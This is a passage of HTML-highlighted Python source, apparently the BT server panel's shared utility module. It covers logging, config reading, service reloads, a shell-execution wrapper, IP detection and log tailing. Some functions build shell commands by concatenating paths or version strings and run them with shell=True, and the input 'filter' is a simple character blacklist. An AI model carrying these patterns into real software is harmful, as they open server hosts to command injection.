class="number">1</span></span><br><span class="line">    tmp_msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> not_web:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">from</span> BTPanel <span class="keyword">import</span> session</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">                username = session[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">                uid = session[<span class="string">&#x27;uid&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">global</span> _LAN_LOG</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> _LAN_LOG:</span><br><span class="line">        _LAN_LOG = json.loads(ReadFile(<span class="string">&#x27;BTPanel/static/language/&#x27;</span> + GetLanguage() + <span class="string">&#x27;/log.json&#x27;</span>))</span><br><span class="line">    keys = _LAN_LOG.keys()</span><br><span class="line">    <span class="keyword">if</span> logMsg <span class="keyword">in</span> keys:</span><br><span class="line">        logMsg = _LAN_LOG[logMsg]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(args)):</span><br><span class="line">            rep = <span class="string">&#x27;&#123;&#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">            logMsg = logMsg.replace(rep,args[i])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> <span class="keyword">in</span> keys: <span class="built_in">type</span> = _LAN_LOG[<span class="built_in">type</span>]</span><br><span class="line">    sql = db.Sql()</span><br><span class="line">    mDate = time.strftime(<span class="string">&#x27;%Y-%m-%d %X&#x27;</span>,time.localtime())</span><br><span class="line">    data = (uid,username,<span class="built_in">type</span>,logMsg + tmp_msg,mDate)</span><br><span class="line">    result = sql.table(<span class="string">&#x27;logs&#x27;</span>).add(<span class="string">&#x27;uid,username,type,log,addtime&#x27;</span>,data)</span><br><span class="line">    <span class="comment">#except:</span></span><br><span class="line">        <span class="comment">#pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetLanguage</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    取语言</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> GetConfigValue(<span class="string">&quot;language&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_language</span>():</span><br><span class="line">    <span class="keyword">return</span> GetLanguage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetConfigValue</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    取配置值</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    config = GetConfig()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> key <span class="keyword">in</span> config.keys(): <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> config[key]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SetConfigValue</span>(<span class="params">key,value</span>):</span><br><span class="line">    config = GetConfig()</span><br><span class="line">    config[key] = value</span><br><span class="line">    WriteConfig(config)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetConfig</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    取所有配置项</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    path = <span class="string">&quot;config/config.json&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path): <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">    f_body = ReadFile(path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> f_body: <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> json.loads(f_body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">WriteConfig</span>(<span class="params">config</span>):</span><br><span class="line">    path = <span class="string">&quot;config/config.json&quot;</span></span><br><span class="line">    WriteFile(path,json.dumps(config))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetLan</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    取提示消息</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> _LAN_TEMPLATE</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> _LAN_TEMPLATE:</span><br><span class="line">        _LAN_TEMPLATE = json.loads(ReadFile(<span class="string">&#x27;BTPanel/static/language/&#x27;</span> + GetLanguage() + <span class="string">&#x27;/template.json&#x27;</span>))</span><br><span class="line">    keys = _LAN_TEMPLATE.keys()</span><br><span class="line">    msg = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        msg = _LAN_TEMPLATE[key]</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLan</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">return</span> GetLan(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetMsg</span>(<span class="params">key,args = (<span class="params"></span>)</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">global</span> _LAN_PUBLIC</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _LAN_PUBLIC:</span><br><span class="line">            _LAN_PUBLIC = json.loads(ReadFile(<span class="string">&#x27;BTPanel/static/language/&#x27;</span> + GetLanguage() + <span class="string">&#x27;/public.json&#x27;</span>))</span><br><span class="line">        keys = _LAN_PUBLIC.keys()</span><br><span class="line">        msg = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> keys:</span><br><span class="line">            msg = _LAN_PUBLIC[key]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(args)):</span><br><span class="line">                rep = <span class="string">&#x27;&#123;&#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">                msg = msg.replace(rep,args[i])</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMsg</span>(<span class="params">key,args = (<span class="params"></span>)</span>):</span><br><span class="line">    <span class="keyword">return</span> GetMsg(key,args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取Web服务器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetWebServer</span>():</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;/www/server/apache/bin/apachectl&#x27;</span>):</span><br><span class="line">        webserver = <span class="string">&#x27;apache&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> os.path.exists(<span class="string">&#x27;/usr/local/lsws/bin/lswsctrl&#x27;</span>):</span><br><span class="line">        webserver = <span class="string">&#x27;openlitespeed&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        webserver = <span class="string">&#x27;nginx&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> webserver</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_webserver</span>():</span><br><span class="line">    <span class="keyword">return</span> GetWebServer()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ServiceReload</span>():</span><br><span class="line">    <span class="comment">#重载Web服务配置</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;/www/server/nginx/sbin/nginx&#x27;</span>):</span><br><span class="line">        result = ExecShell(<span class="string">&#x27;/etc/init.d/nginx reload&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">1</span>].find(<span class="string">&#x27;nginx.pid&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">            ExecShell(<span class="string">&#x27;pkill -9 nginx &amp;&amp; sleep 1&#x27;</span>)</span><br><span class="line">            ExecShell(<span class="string">&#x27;/etc/init.d/nginx start&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> os.path.exists(<span class="string">&#x27;/www/server/apache/bin/apachectl&#x27;</span>):</span><br><span class="line">        result = ExecShell(<span class="string">&#x27;/etc/init.d/httpd reload&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = ExecShell(<span class="string">&#x27;rm -f /tmp/lshttpd/*.sock* &amp;&amp; /usr/local/lsws/bin/lswsctrl restart&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serviceReload</span>():</span><br><span class="line">    <span class="keyword">return</span> ServiceReload()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ExecShell</span>(<span class="params">cmdstring, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, shell=<span class="literal">True</span></span>):</span><br><span class="line">    a = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    e = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">import</span> subprocess,tempfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rx = md5(cmdstring)</span><br><span class="line">        succ_f = tempfile.SpooledTemporaryFile(max_size=<span class="number">4096</span>,mode=<span class="string">&#x27;wb+&#x27;</span>,suffix=<span class="string">&#x27;_succ&#x27;</span>,prefix=<span class="string">&#x27;btex_&#x27;</span> + rx ,<span class="built_in">dir</span>=<span class="string">&#x27;/dev/shm&#x27;</span>)</span><br><span class="line">        err_f = tempfile.SpooledTemporaryFile(max_size=<span class="number">4096</span>,mode=<span class="string">&#x27;wb+&#x27;</span>,suffix=<span class="string">&#x27;_err&#x27;</span>,prefix=<span class="string">&#x27;btex_&#x27;</span> + rx ,<span class="built_in">dir</span>=<span class="string">&#x27;/dev/shm&#x27;</span>)</span><br><span class="line">        sub = subprocess.Popen(cmdstring, close_fds=<span class="literal">True</span>, shell=shell,bufsize=<span class="number">128</span>,stdout=succ_f,stderr=err_f)</span><br><span class="line">        sub.wait()</span><br><span class="line">        err_f.seek(<span class="number">0</span>)</span><br><span class="line">        succ_f.seek(<span class="number">0</span>)</span><br><span class="line">        a = succ_f.read()</span><br><span class="line">        e = err_f.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> err_f.closed: err_f.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> succ_f.closed: succ_f.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(get_error_info())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#编码修正</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(a) == <span class="built_in">bytes</span>: a = a.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(e) == <span class="built_in">bytes</span>: e = e.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a,e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetLocalIp</span>():</span><br><span class="line">    <span class="comment">#取本地外网IP</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filename = <span class="string">&#x27;data/iplist.txt&#x27;</span></span><br><span class="line">        ipaddress = readFile(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ipaddress:</span><br><span class="line">            url = <span class="string">&#x27;http://pv.sohu.com/cityjson?ie=utf-8&#x27;</span></span><br><span class="line">            m_str = HttpGet(url)</span><br><span class="line">            ipaddress = re.search(<span class="string">r&#x27;\d+.\d+.\d+.\d+&#x27;</span>,m_str).group(<span class="number">0</span>)</span><br><span class="line">            WriteFile(filename,ipaddress)</span><br><span class="line">        c_ip = check_ip(ipaddress)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> c_ip: <span class="keyword">return</span> GetHost()</span><br><span class="line">        <span class="keyword">return</span> ipaddress</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = GetConfigValue(<span class="string">&#x27;home&#x27;</span>) + <span class="string">&#x27;/Api/getIpAddress&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> HttpGet(url)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> GetHost()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_ipv4</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.inet_pton(socket.AF_INET, ip)</span><br><span class="line">    <span class="keyword">except</span> AttributeError:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            socket.inet_aton(ip)</span><br><span class="line">        <span class="keyword">except</span> socket.error:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> ip.count(<span class="string">&#x27;.&#x27;</span>) == <span class="number">3</span></span><br><span class="line">    <span class="keyword">except</span> socket.error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_ipv6</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.inet_pton(socket.AF_INET6, ip)</span><br><span class="line">    <span class="keyword">except</span> socket.error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">return</span> is_ipv4(ip) <span class="keyword">or</span> is_ipv6(ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetHost</span>(<span class="params">port = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">    host_tmp = request.headers.get(<span class="string">&#x27;host&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> host_tmp:</span><br><span class="line">        <span class="keyword">if</span> request.url_root:</span><br><span class="line">            tmp = re.findall(<span class="string">r&quot;(https|http)://([\w:\.-]+)&quot;</span>,request.url_root)</span><br><span class="line">            <span class="keyword">if</span> tmp: host_tmp = tmp[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> host_tmp:</span><br><span class="line">        host_tmp = GetLocalIp() + <span class="string">&#x27;:&#x27;</span> + readFile(<span class="string">&#x27;data/port.pl&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> host_tmp.find(<span class="string">&#x27;:&#x27;</span>) == -<span class="number">1</span>: host_tmp += <span class="string">&#x27;:80&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        host_tmp = <span class="string">&quot;127.0.0.1:8888&quot;</span></span><br><span class="line">    h = host_tmp.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> port: <span class="keyword">return</span> h[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;:&#x27;</span>.join(h[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetClientIp</span>():</span><br><span class="line">    <span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">    <span class="keyword">return</span> request.remote_addr.replace(<span class="string">&#x27;::ffff:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phpReload</span>(<span class="params">version</span>):</span><br><span class="line">    <span class="comment">#重载PHP配置</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;/www/server/php/&#x27;</span> + version + <span class="string">&#x27;/libphp5.so&#x27;</span>):</span><br><span class="line">        ExecShell(<span class="string">&#x27;/etc/init.d/httpd reload&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ExecShell(<span class="string">&#x27;/etc/init.d/php-fpm-&#x27;</span>+version+<span class="string">&#x27; reload&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_timeout</span>(<span class="params">url,timeout=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start = time.time()</span><br><span class="line">        result = <span class="built_in">int</span>(httpGet(url,timeout))</span><br><span class="line">        <span class="keyword">return</span> result,<span class="built_in">int</span>((time.time() - start) * <span class="number">1000</span> - <span class="number">500</span>)</span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">return</span> <span class="number">0</span>,<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_url</span>(<span class="params">timeout = <span class="number">0.5</span></span>):</span><br><span class="line">    <span class="keyword">import</span> json</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        nodeFile = <span class="string">&#x27;data/node.json&#x27;</span></span><br><span class="line">        node_list = json.loads(readFile(nodeFile))</span><br><span class="line">        mnode1 = []</span><br><span class="line">        mnode2 = []</span><br><span class="line">        mnode3 = []</span><br><span class="line">        new_node_list = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> node_list:</span><br><span class="line">            node[<span class="string">&#x27;net&#x27;</span>],node[<span class="string">&#x27;ping&#x27;</span>] = get_timeout(node[<span class="string">&#x27;protocol&#x27;</span>] + node[<span class="string">&#x27;address&#x27;</span>] + <span class="string">&#x27;:&#x27;</span> + node[<span class="string">&#x27;port&#x27;</span>] + <span class="string">&#x27;/net_test&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">            new_node_list[node[<span class="string">&#x27;address&#x27;</span>]] = node[<span class="string">&#x27;ping&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node[<span class="string">&#x27;ping&#x27;</span>]: <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> node[<span class="string">&#x27;ping&#x27;</span>] &lt; <span class="number">100</span>:      <span class="comment">#当响应时间&lt;100ms且可用带宽大于1500KB时</span></span><br><span class="line">                <span class="keyword">if</span> node[<span class="string">&#x27;net&#x27;</span>] &gt; <span class="number">1500</span>:</span><br><span class="line">                    mnode1.append(node)</span><br><span class="line">                <span class="keyword">elif</span> node[<span class="string">&#x27;net&#x27;</span>] &gt; <span class="number">1000</span>:</span><br><span class="line">                    mnode3.append(node)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> node[<span class="string">&#x27;net&#x27;</span>] &gt; <span class="number">1000</span>:  <span class="comment">#当响应时间&gt;=100ms且可用带宽大于1000KB时</span></span><br><span class="line">                    mnode2.append(node)</span><br><span class="line">            <span class="keyword">if</span> node[<span class="string">&#x27;ping&#x27;</span>] &lt; <span class="number">100</span>:</span><br><span class="line">                <span class="keyword">if</span> node[<span class="string">&#x27;net&#x27;</span>] &gt; <span class="number">3000</span>: <span class="keyword">break</span> <span class="comment">#有节点可用带宽大于3000时，不再检查其它节点</span></span><br><span class="line">        <span class="keyword">if</span> mnode1: <span class="comment">#优选低延迟高带宽</span></span><br><span class="line">            mnode = <span class="built_in">sorted</span>(mnode1,key= <span class="keyword">lambda</span>  x:x[<span class="string">&#x27;net&#x27;</span>],reverse=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">elif</span> mnode3: <span class="comment">#备选低延迟，中等带宽</span></span><br><span class="line">            mnode = <span class="built_in">sorted</span>(mnode3,key= <span class="keyword">lambda</span>  x:x[<span class="string">&#x27;net&#x27;</span>],reverse=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>: <span class="comment">#终选中等延迟，中等带宽</span></span><br><span class="line">            mnode = <span class="built_in">sorted</span>(mnode2,key= <span class="keyword">lambda</span>  x:x[<span class="string">&#x27;ping&#x27;</span>],reverse=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> mnode: <span class="keyword">return</span> <span class="string">&#x27;http://download.bt.cn&#x27;</span></span><br><span class="line"></span><br><span class="line">        new_node_keys = new_node_list.keys()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(node_list)):</span><br><span class="line">            <span class="keyword">if</span> node_list[i][<span class="string">&#x27;address&#x27;</span>] <span class="keyword">in</span> new_node_keys:</span><br><span class="line">                node_list[i][<span class="string">&#x27;ping&#x27;</span>] = new_node_list[node_list[i][<span class="string">&#x27;address&#x27;</span>]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                node_list[i][<span class="string">&#x27;ping&#x27;</span>] = <span class="number">500</span></span><br><span class="line"></span><br><span class="line">        new_node_list = <span class="built_in">sorted</span>(node_list,key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;ping&#x27;</span>],reverse=<span class="literal">False</span>)</span><br><span class="line">        writeFile(nodeFile,json.dumps(new_node_list))</span><br><span class="line">        <span class="keyword">return</span> mnode[<span class="number">0</span>][<span class="string">&#x27;protocol&#x27;</span>] + mnode[<span class="number">0</span>][<span class="string">&#x27;address&#x27;</span>] + <span class="string">&#x27;:&#x27;</span> + mnode[<span class="number">0</span>][<span class="string">&#x27;port&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;http://download.bt.cn&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkInput</span>(<span class="params">data</span>):</span><br><span class="line">   <span class="keyword">if</span> <span class="keyword">not</span> data: <span class="keyword">return</span> data</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">type</span>(data) != <span class="built_in">str</span>: <span class="keyword">return</span> data</span><br><span class="line">   checkList = [</span><br><span class="line">                &#123;<span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;＜&#x27;</span>&#125;,</span><br><span class="line">                &#123;<span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;＞&#x27;</span>&#125;,</span><br><span class="line">                &#123;<span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;‘&#x27;</span>&#125;,</span><br><span class="line">                &#123;<span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;“&#x27;</span>&#125;,</span><br><span class="line">                &#123;<span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;＆&#x27;</span>&#125;,</span><br><span class="line">                &#123;<span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;＃&#x27;</span>&#125;,</span><br><span class="line">                &#123;<span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;＜&#x27;</span>&#125;</span><br><span class="line">                ]</span><br><span class="line">   <span class="keyword">for</span> v <span class="keyword">in</span> checkList:</span><br><span class="line">       data = data.replace(v[<span class="string">&#x27;d&#x27;</span>],v[<span class="string">&#x27;r&#x27;</span>])</span><br><span class="line">   <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#取文件指定尾行数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetNumLines</span>(<span class="params">path,num,p=<span class="number">1</span></span>):</span><br><span class="line">    pyVersion = sys.version_info[<span class="number">0</span>]</span><br><span class="line">    max_len = <span class="number">1024</span>*<span class="number">128</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> cgi</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path): <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        start_line = (p - <span class="number">1</span>) * num</span><br><span class="line">        count = start_line + num</span><br><span class="line">        fp = <span class="built_in">open</span>(path,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        buf = <span class="string">&quot;&quot;</span></span><br><span class="line">        fp.seek(-<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> fp.read(<span class="number">1</span>) == <span class="string">&quot;\n&quot;</span>: fp.seek(-<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">        data = []</span><br><span class="line">        total_len = <span class="number">0</span></span><br><span class="line">        b = <span class="literal">True</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                newline_pos = <span class="built_in">str</span>.rfind(<span class="built_in">str</span>(buf), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                pos = fp.tell()</span><br><span class="line">                <span class="keyword">if</span> newline_pos != -<span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> n &gt;= start_line:</span><br><span class="line">                        line = buf[newline_pos + <span class="number">1</span>:]</span><br><span class="line">                        line_len = <span class="built_in">len</span>(line)</span><br><span class="line">                        total_len += line_len</span><br><span class="line">                        sp_len = total_len - max_len</span><br><span class="line">                        <span class="keyword">if</span> sp_len &gt; <span class="number">0</span>:</span><br><span class="line">                            line = line[sp_len:]</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            data.insert(<span class="number">0</span>,cgi.escape(line))</span><br><span class="line">                        <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">                    buf = buf[:newline_pos]</span><br><span class="line">                    n += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> pos == <span class="number">0</span>:</span><br><span class="line">                        b = <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    to_read = <span class="built_in">min</span>(<span class="number">4096</span>, pos)</span><br><span class="line">                    fp.seek(-to_read, <span class="number">1</span>)</span><br><span class="line">                    t_buf = fp.read(to_read)</span><br><span class="line">                    <span class="keyword">if</span> pyVersion == <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">type</span>(t_buf) == <span class="built_in">bytes</span>: t_buf = t_buf.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                        <span class="keyword">except</span>:t_buf = <span class="built_in">str</span>(t_buf)</span><br><span class="line">                    buf = t_buf + buf</span><br><span class="line">                    fp.seek(-to_read, <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">if</span> pos - to_read == <span class="number">0</span>:</span><br><span class="line">                        buf = <span class="string">&quot;\n&quot;</span> + buf</span><br><span class="line">                <span class="keyword">if</span> total_len &gt;= max_len: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> b: <span class="keyword">break</span></span><br><span class="line">        fp.close()</span><br><span class="line">        result = <span class="string">&quot;\n&quot;</span>.join(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> result: <span class="keyword">raise</span> Exception(<span class="string">&#x27;null&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        result = ExecShell(<span class="string">&quot;tail -n &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(num,path))[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result) &gt; max_len:</span><br><span class="line">            result = result[-max_len:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = json.dumps(result)</span><br><span class="line">            <span class="keyword">return</span> json.loads(result).strip()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> pyVersion == <span class="number">2</span>:</span><br><span class="line">                result = result.decode(<span class="string">&#x27;utf8&#x27;</span>,errors=<span 